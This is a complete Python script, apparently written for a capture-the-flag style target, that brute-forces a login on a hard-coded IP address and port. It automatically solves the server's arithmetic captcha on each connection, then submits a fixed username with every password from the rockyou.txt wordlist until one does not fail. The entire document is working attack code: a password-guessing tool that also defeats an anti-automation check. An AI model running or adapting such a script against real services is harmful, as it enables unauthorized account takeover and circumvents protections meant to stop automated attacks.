import re
import socket
import time

host = "157.230.179.99"
port = 1337
wordlist = "./rockyou.txt"


def brute_force():
    

    username = "ejnorman84" + '\n'
    for password in open(wordlist, 'r'):
        password += '\n'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        time.sleep(2)
        capt = s.recv(1024)             #held the captcha data
        capt1 = capt.decode("utf-8")    #converted captcha to string
        capt2 = [int(i) for i in capt1.split() if i.isdigit()]  #finds the ints in capt1
        oper = re.findall("\+|-|\*|\/", capt1)                  #finds which operator is being used
        if "+" in oper:                     #These do the operator with the ints stored in capt2
            ans = capt2[0] + capt2[1]
        elif "-" in oper:
            ans = capt2[0] - capt2[1]
        elif "*" in oper:
            ans = capt2[0] * capt2[1]
        elif "/" in oper:
            ans = capt2[0] // capt2[1]
        else:
            ans = ''
        ans = str(ans) + '\n'
        s.send(ans.encode())                #sends the operation
        s.send(username.encode())           #sends the username(ejnorman84)
        s.send(password.encode())           #sends the the current password
        time.sleep(1)
        failcheck = (s.recv(1024).decode()) #checks if the password fails
        print(password)
        if "Fail" in failcheck:
            print(failcheck)
        else:                               #kicks out if the correct password is found
            print(failcheck)
            break


brute_force()
